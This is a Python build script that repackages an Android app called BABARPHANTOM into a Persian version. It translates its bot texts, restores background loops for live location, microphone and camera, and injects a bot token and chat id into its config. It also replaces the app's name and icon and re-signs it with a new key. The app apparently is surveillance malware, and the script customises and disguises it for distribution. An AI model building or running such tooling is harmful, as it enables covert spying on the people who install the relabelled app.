#!/usr/bin/env python3
"""
build_apk.py -- produce the localised (Persian) BABARPHANTOM APK.

Pipeline
--------
1. patch the DEX files        -> Persian bot texts (tools/translation_fa.json)
2. repair the background loops-> the live-location / mic / camera loops
3. patch resources.arsc       -> the launcher label
4. rewrite assets/logo.json   -> bot token / chat id / feature switches
5. optionally swap the launcher icon
6. repack the APK
7. sign it with a dedicated RSA key (v1 / JAR signature, no Java needed)

Everything runs on plain Python 3 -- no Java, no apktool, no aapt.

Usage:
    python3 build_apk.py [--src SRC.apk] [--out OUT.apk]
                         [--map mapping.json] [--config config.json]
                         [--name "نام برنامه"] [--icon icon.png]
                         [--key key.pem] [--no-sign] [--no-loop-fix]
"""

import argparse
import json
import os
import shutil
import sys
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import apk_sign  # noqa: E402
import arsc_patch  # noqa: E402
import fix_loops  # noqa: E402
from dexpatch import patch_dex  # noqa: E402


def load_json(path, default=None):
    if not path or not os.path.exists(path):
        return default
    with open(path, encoding="utf-8") as fh:
        return json.load(fh)


def build(src, out, mapping, config, app_name, icon, key, sign=True, loop_fix=True):
    zin = zipfile.ZipFile(src, "r")
    overrides = {}
    total = 0
    loops = 0

    # ------------------------------------------------------------------
    # 1) + 2) DEX files: strings and background loops
    # ------------------------------------------------------------------
    for name in zin.namelist():
        base = name.split("/")[-1]
        if not (base.startswith("classes") and base.endswith(".dex")):
            continue
        data = zin.read(name)
        changed = data

        repl = mapping.get(base) if mapping else None
        if repl:
            changed, applied = patch_dex(changed, repl)
            if applied:
                total += len(applied)
                print(f"[dex ] {name}: {len(applied)} strings translated")

        if loop_fix and base == "classes3.dex":
            changed, fixed = fix_loops.patch(changed)
            if fixed:
                loops = len(fixed)
                print(f"[loop] {name}: {loops} background loops repaired")

        if changed is not data:
            overrides[name] = changed

    # ------------------------------------------------------------------
    # 3) resources.arsc -> application label
    # ------------------------------------------------------------------
    if app_name and "resources.arsc" in zin.namelist():
        arsc = zin.read("resources.arsc")
        out_arsc, applied = arsc_patch.patch_arsc(arsc, {"BABARPHANTOM": app_name})
        if applied:
            overrides["resources.arsc"] = out_arsc
            print(f"[arsc] application label -> {app_name!r}")

    # ------------------------------------------------------------------
    # 4) assets/logo.json -> runtime configuration
    # ------------------------------------------------------------------
    if config and "assets/logo.json" in zin.namelist():
        current = json.loads(zin.read("assets/logo.json").decode("utf-8"))
        current.update(config)
        blob = json.dumps(current, ensure_ascii=False, indent=2).encode("utf-8")
        overrides["assets/logo.json"] = blob
        print(f"[cfg ] assets/logo.json updated ({len(config)} keys)")

    # ------------------------------------------------------------------
    # 5) launcher icon
    # ------------------------------------------------------------------
    if icon and os.path.exists(icon):
        icon_data = open(icon, "rb").read()
        count = 0
        for cand in zin.namelist():
            if cand.startswith("res/mipmap") and cand.endswith(".png"):
                overrides[cand] = icon_data
                count += 1
        print(f"[icon] {count} launcher icons replaced from {icon}")

    # ------------------------------------------------------------------
    # 6) repack
    # ------------------------------------------------------------------
    tmp = out + ".tmp"
    with zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zout:
        for info in zin.infolist():
            if info.filename.startswith("META-INF/"):
                continue
            data = overrides.get(info.filename)
            if data is None:
                data = zin.read(info.filename)
            ni = zipfile.ZipInfo(info.filename, date_time=info.date_time)
            ni.compress_type = info.compress_type
            ni.external_attr = info.external_attr
            zout.writestr(ni, data)
    zin.close()

    # ------------------------------------------------------------------
    # 7) sign
    # ------------------------------------------------------------------
    if sign:
        if not key:
            key = os.path.abspath(out + ".key.pem")
        if not os.path.exists(key):
            apk_sign.generate_key(key)
            print(f"[sign] new key generated: {key}")
        apk_sign.sign_apk(tmp, out, key)
        os.remove(tmp)
        print(f"[sign] signed with {key}")
    else:
        shutil.move(tmp, out)

    print(f"[done] {out}  ({total} strings translated, {loops} loops repaired)")
    return total


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--src", default="BABARPHANTOM (1)_sign_sign.apk")
    ap.add_argument("--out", default="dist/BABARPHANTOM_FA.apk")
    ap.add_argument("--map", default=os.path.join(HERE, "translation_fa.json"))
    ap.add_argument("--config", default=None, help="JSON with logo.json overrides")
    ap.add_argument("--name", default=None, help="new launcher label")
    ap.add_argument("--icon", default=None, help="replacement launcher icon (png)")
    ap.add_argument("--key", default=None)
    ap.add_argument("--no-sign", action="store_true")
    ap.add_argument("--no-loop-fix", action="store_true")
    args = ap.parse_args()

    build(
        src=args.src,
        out=args.out,
        mapping=load_json(args.map, {}),
        config=load_json(args.config, None),
        app_name=args.name,
        icon=args.icon,
        key=args.key,
        sign=not args.no_sign,
        loop_fix=not args.no_loop_fix,
    )


if __name__ == "__main__":
    main()
